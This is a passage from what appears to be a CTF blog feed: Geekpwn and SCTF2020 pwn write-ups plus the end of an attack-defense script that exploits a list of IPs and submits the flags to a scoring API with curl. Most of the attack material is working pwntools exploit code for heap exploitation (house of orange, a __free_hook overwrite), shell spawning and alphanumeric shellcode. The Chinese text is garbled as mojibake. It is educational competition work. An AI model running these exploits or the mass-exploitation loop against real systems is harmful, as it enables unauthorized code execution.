flag</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad_luck&quot;</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./pwn&quot;,checksec=False)</span></span><br><span class="line">ips = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).readlines()]</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">flag = main(ip)</span><br><span class="line"><span class="comment"># flag = main(args[&quot;REMOTE&quot;])</span></span><br><span class="line">info(flag)</span><br><span class="line">url = <span class="string">&#x27;https://172.20.1.1/Answerapi/sub_answer_api&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;token9013e05455d&#x27;</span></span><br><span class="line">cmds = <span class="string">&#x27;curl -k &#123;&#125; -d &quot;answer=&#123;&#125;&amp;playertoken=&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(url,flag.strip(),token)</span><br><span class="line"><span class="built_in">print</span> cmds</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> cmds:</span><br><span class="line">os.system(cmds)</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line">p.close()</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>ruanå¸ˆå‚…nbï¼Œæˆ‘è¿˜æ˜¯å¤ªå¹´è½»äº†ã€‚è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°:D</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geekpwn</title>
      <link href="/2020/07/18/Geekpwn/"/>
      <url>/2020/07/18/Geekpwn/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01paperpointer"><a href="#0x01paperpointer" class="headerlink" title="0x01paperpointer"></a>0x01paperpointer</h3><p>å…ˆä»‹ç»ä¸‹æœ¬é¢˜çš„åˆ©ç”¨æ‰‹æ³•:house of orange</p><span id="more"></span><p>å‰æï¼šéœ€è¦æœ‰è¾ƒå¤§èŒƒå›´å†…çš„å †æº¢å‡º,å¹¶æ³„éœ²libcåŸºå€ã€‚</p><p>1ã€åˆ é™¤ä¸€ä¸ªå †å—è‡³unsorted binï¼Œå¹¶ä¿®æ”¹è¯¥chunkçš„bkä¸º_IO_list_all-0x10ã€‚</p><p>å‚è€ƒæºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            [...]</span><br><span class="line">            <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">            unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);<span class="comment">//æ”»å‡»å¼€å§‹å‡½æ•°</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å½“remove from unsorted listæ—¶ï¼Œbck&#x3D;_IO_list_all-0x10ï¼Œunsorted_chunks(av)&#x3D;main_arean+88</p><p>å› æ­¤èµ‹å€¼æ˜¯ä¼šå‘ç”Ÿï¼š</p><p>main_arean+88+0x18&#x3D;_IO_list_all-0x10</p><p>_IO_list_all-0x10+0x10&#x3D;main_arean+88</p><p>è¯´æ˜ï¼šè¿›ç¨‹å†…æ‰€æœ‰çš„_IO_FILE ç»“æ„ä¼šä½¿ç”¨_chain åŸŸç›¸äº’è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œè¿™ä¸ªé“¾è¡¨çš„å¤´éƒ¨ç”±_IO_list_all ç»´æŠ¤ï¼Œå…¶ä¸€èˆ¬æŒ‡å‘IO_2_1_stderr</p><p>æ‰€ä»¥ç­‰åˆ°å‡½æ•°è°ƒç”¨æ—¶ï¼Œå°±ä¼šä» _IO_2_1_stderr*æ”¹å˜å» arena é‡Œã€‚</p><p>2ã€ä¿®æ”¹è¯¥unsorted binçš„pre+sizeä¸ºâ€™&#x2F;bin&#x2F;shâ€™,sizeä¸º0x61ã€‚</p><p>å‚è€ƒæºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    [...]</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬ä¼ªé€ çš„sizeä¸º0x61ï¼Œæ‰€ä»¥ä¼šè¿›å…¥small binï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„èµ‹å€¼æ“ä½œä¸ºï¼š</p><p>fwd-&gt;bk&#x3D;victim</p><p>å³ï¼šmain_arean+88+0x60+0x18&#x3D;victim(chunkåœ°å€)</p><p>è€Œåœ¨IO_fileçš„ç»“æ„ä½“ä¸­,offsetä¸º0x78å¤„æ­£å¥½ä¸º<code>_chain </code>æŒ‡é’ˆ,æ‰€ä»¥è‹¥æ˜¯åœ¨ arena é‡Œçš„fileæµè¦è·³è½¬ï¼Œå°±ä¼šè·³è½¬åˆ°åŸchunké‡Œ</p><p>è¯´æ˜ï¼š<code>struct _IO_FILE _chain;/æŒ‡å‘ä¸‹ä¸€ä¸ªfileç»“æ„/</code></p><p>3ã€ä¼ªé€ fileé‡Œçš„æ•°æ®ç»•è¿‡æ£€æŸ¥ã€‚</p><p>_mode &lt;&#x3D; 0<br>_IO_write_ptr &gt;_IO_write_base<br>æˆ–<br>_IO_vtable_offset (fp) &#x3D;&#x3D; 0ï¼ˆæ— æ³•å˜åŠ¨ï¼‰<br>_mode &gt; 0<br>_wide_data-&gt;_IO_write_ptr &gt; wide_data-&gt;_IO_write_base</p><p><img src="https://p4.ssl.qhimg.com/t01b54b51a896518067.png" alt="img"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&quot;183.60.136.230&quot;</span>,<span class="number">16145</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">offset,sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">offset</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">sleep=<span class="built_in">int</span>(p.recv(<span class="number">3</span>),<span class="number">16</span>)</span><br><span class="line">byte=(sleep&lt;&lt;<span class="number">8</span>)+<span class="number">0xa00000</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(byte)</span><br><span class="line">edit(<span class="number">0x400</span>,<span class="number">0x200</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x141</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x130</span>-<span class="number">0x60</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0xc0</span>,<span class="number">0x200</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0xd0</span>)</span><br><span class="line">dele(<span class="number">0xf0</span>)</span><br><span class="line">dele(<span class="number">0x410</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0xf8</span>,<span class="number">3</span>,p64(byte-<span class="number">0x86e60</span>-<span class="number">0x10</span>))</span><br><span class="line">dele(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0x18</span>,<span class="number">3</span>,p64(byte+<span class="number">0x2f9310</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>))</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">16</span>,p64(<span class="number">2</span>)+p64(<span class="number">3</span>))</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span> :</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x02babypwn"><a href="#0x02babypwn" class="headerlink" title="0x02babypwn"></a>0x02babypwn</h3><p>åˆ©ç”¨show()è´Ÿæ•°æ³„éœ²libcï¼Œåˆ©ç”¨malloc(0)å®ç°å †æº¢å‡ºï¼ˆ0-1ä¸ºæœ€å¤§æ— ç¬¦å·æ•´å½¢ï¼‰</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><p>fastbin attcakåœ¨top_chunké™„è¿‘è¸©å‡ºåˆé€‚sizeã€‚</p><p>ä¿®æ”¹top_chunkè‡³__free_hooké™„è¿‘ã€‚</p><p>è¦†ç›–__free_hookä¸ºsystemã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(name))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">show(-<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5710</span></span><br><span class="line">success(<span class="string">&quot;libc : &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x10</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x30</span>,<span class="string">&quot;oooo\n&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)+p64(<span class="number">0x51</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x30</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x10</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x40</span>,<span class="string">&quot;oooo\n&quot;</span>)<span class="comment">#3</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>)+p64(libc.address+<span class="number">0x3c4b30</span>)+<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x40</span>,<span class="string">&quot;/bin/sh\n&quot;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span>+p64(libc.address+<span class="number">0x3c5c50</span>)[:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="string">&quot;oooo\n&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffff</span>)+<span class="string">&quot;\x00&quot;</span>*<span class="number">0xb28</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#print hex(libc.sym[&#x27;__free_hook&#x27;])</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2020</title>
      <link href="/2020/07/07/SCTF2020/"/>
      <url>/2020/07/07/SCTF2020/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01coolcode"><a href="#0x01coolcode" class="headerlink" title="0x01coolcode"></a>0x01coolcode</h3><h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>16çš„ä¸€é“pwné¢˜ï¼Œå¼€äº†sandboxï¼š</p><span id="more"></span><p><img src="https://img-blog.csdnimg.cn/20200706093615364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTE2OTc3,size_16,color_FFFFFF,t_70" alt="img"></p><p>ç¦ç”¨openï¼Œä½†fstatå‡½æ•°ç³»ç»Ÿè°ƒç”¨å·ä¸º5ï¼Œæƒ³åˆ°åˆ©ç”¨retfæ§åˆ¶csä¿®æ”¹è¿è¡Œæ¨¡å¼ä¸º32ä½æ±‡ç¼–ï¼ˆopenåœ¨32ä½ä¸‹è°ƒç”¨å·æ­£å¥½ä¸º5ï¼‰</p><p>åŒæ—¶çœ‹åˆ°å †å¯æ‰§è¡Œï¼š</p><p> <code>       0x1607000          0x1628000 rwxp    21000 0      [heap]</code></p><p>äºæ˜¯å¯ä»¥åœ¨å †ä¸Šéƒ¨shellcodeï¼Œä½†è¾“å…¥å †çš„æ—¶å€™æœ‰checkåªèƒ½æ˜¯æ•°å­—å’Œå¤§å†™å­—æ¯ï¼Œä¸”é•¿åº¦ä¸º0x20ï¼Œå› æ­¤ä¸€èˆ¬çš„shellcodeè½¬åŒ–å·¥å…·å› å¤ªé•¿æ— æ³•ä½¿ç”¨ï¼Œåªèƒ½æ‰‹æ’¸ã€‚</p><p>èƒ½ç”¨çš„åªèƒ½æ˜¯éƒ¨åˆ†xorå’Œpop&#x2F;pushè¿™æ ·çš„æŒ‡ä»¤ï¼Œå¯ä»¥å…ˆæ„é€ æ‰§è¡Œreadï¼Œä¹‹åçš„è¾“å…¥å°±æ²¡checkçš„é™åˆ¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                xor al,0x41</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x4b],al</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x4c],al</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x4a],al</span></span><br><span class="line"><span class="string">                xor al,0x41</span></span><br><span class="line"><span class="string">                xor al,0x53</span></span><br><span class="line"><span class="string">                xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">                push rbx</span></span><br><span class="line"><span class="string">                push rbx</span></span><br><span class="line"><span class="string">                pop rax</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        sc += <span class="string">&#x27;M2WND&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨xorå’Œâ€™M2WNDâ€™æ„é€ å‡ºsyscallæ‰§è¡Œread(0,å †åœ°å€,size)</p><p>ruanå¸ˆå‚…<img src="file:///C:\Users\admin\AppData\Local\Temp\SGPicFaceTpBq\20852\77B2E8F6.png" alt="img"><img src="file:///C:\Users\admin\AppData\Local\Temp\SGPicFaceTpBq\20852\77B2FB64.png" alt="img"></p><p>å“¦å¯¹äº†ï¼Œè·³åˆ°å †ä¸Šæ‰§è¡Œçš„æ–¹æ³•æ˜¯åˆ©ç”¨idxä¸ºè´Ÿæ•°ï¼ˆ-24ï¼‰æ”¹writeçš„gotä¸ºå †åœ°å€ï¼Œåˆ©ç”¨show()å‡½æ•°è§¦å‘åˆ°å †ä¸Šæ‰§è¡Œï¼Œä¹‹åæ‰§è¡Œäº†ä¸€æ¬¡readä¼šä¾¿å¯æŒç»­å¾€ä¸‹éƒ¨ç½²sellcodeä½†è¦æŠŠæ§å¥½è·ç¦»ã€‚å…·ä½“çœ‹è„šæœ¬+è°ƒè¯•ï¼š</p><p>readï¼ˆç”¨äºä¹‹åçš„shellcodeå†™å…¥ï¼‰-&gt;mmapï¼ˆç”³è¯·æ˜ å°„ç©ºé—´ç”¨äºè¯»å…¥flagï¼‰-&gt;openï¼ˆåˆ©ç”¨retfqæ§åˆ¶ç¨‹åºè·³åˆ°æ˜ å°„ç©ºé—´æ‰§è¡Œ32ä¸ºæ±‡ç¼–ï¼‰-&gt;read-&gt;write</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./CoolCode&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot; :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span 